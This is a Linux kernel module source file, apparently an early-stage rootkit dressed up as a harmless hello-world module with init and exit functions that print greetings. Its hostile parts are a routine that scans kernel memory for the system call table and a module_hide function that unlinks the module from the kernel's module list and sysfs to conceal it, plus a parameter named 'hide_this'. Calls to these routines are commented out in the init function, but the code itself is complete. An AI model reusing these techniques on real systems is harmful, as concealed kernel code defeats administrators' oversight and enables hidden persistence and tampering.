#include <linux/init.h>             // Macros used to mark up functions e.g., __init __exit
#include <linux/module.h>           // Core header for loading LKMs into the kernel
#include <linux/kernel.h>           // Contains types, macros, functions for the kernel
#include <linux/syscalls.h>

MODULE_LICENSE("GPL") ;


static unsigned long *syscall_table;
static char *dir_cod = "hide_this";


module_param(dir_cod, charp, 0000); // < Param desc. charp = char ptr,  can be read/not changed
MODULE_PARM_DESC(name, "The name to display in /var/log/kern.log");  ///< parameter description


unsigned long *dinamically_find_syscall_table(void) {
    unsigned long *syscall_table;
    unsigned long int i;

    // PAGE_OFFSET = start of memory, ULONG_MAX = end of memory
    for(i=PAGE_OFFSET; i<ULONG_MAX; i+=sizeof(void *)){
        syscall_table = (unsigned long *)i;

        if (syscall_table[__NR_close] == (unsigned long)sys_close)
            return syscall_table;
    }
    return NULL;
}


static void module_hide(void){
       list_del(&THIS_MODULE->list);
       kobject_del(&THIS_MODULE->mkobj.kobj);
       list_del(&THIS_MODULE->mkobj.kobj.entry);
}

/** @brief The LKM initialization function
 *  The static keyword restricts the visibility of the function to within this C file. The __init
 *  macro means that for a built-in driver (not a LKM) the function is only used at initialization
 *  time and that it can be discarded and its memory freed up after that point.
 *  @return returns 0 if successful
 */
static int __init harmless_init(void){
    //module_hide();
    //syscall_table = dinamically_find_syscall_table();
    printk(KERN_INFO "EBB: Hello from the BBB LKM!\n");
    //if(syscall_table == NULL)
      //printk(KERN_INFO "Couldn't find syscall_table????!\n");
      //return -1;
    return 0;
}

/** @brief The LKM cleanup function
 *  Similar to the initialization function, it is static. The __exit macro notifies that if this
 *  code is used for a built-in driver (not a LKM) that this function is not required.
 */
static void __exit harmless_exit(void){
   printk(KERN_INFO "EBB: Goodbye from the BBB LKM!\n");
}

/** @brief A module must use the module_init() module_exit() macros from linux/init.h, which
 *  identify the initialization function at insertion time and the cleanup function (as
 *  listed above)
 */
module_init(harmless_init);
module_exit(harmless_exit);
